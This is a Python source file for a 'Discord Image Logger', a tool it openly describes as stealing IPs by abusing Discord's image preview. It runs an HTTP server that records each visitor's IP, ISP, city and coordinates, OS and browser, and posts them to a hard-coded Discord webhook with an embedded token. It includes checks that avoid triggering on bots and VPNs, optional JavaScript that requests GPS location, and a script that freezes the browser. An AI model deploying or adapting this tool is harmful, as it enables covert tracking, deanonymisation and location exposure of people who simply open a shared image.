# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1444248968652394520/nCkLryQmC6PIGCcnt9PVEX5Ffei6_-JZVZJapqKwIVWs7NSs1mFDqY0i1tOObUNcPOtp",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI

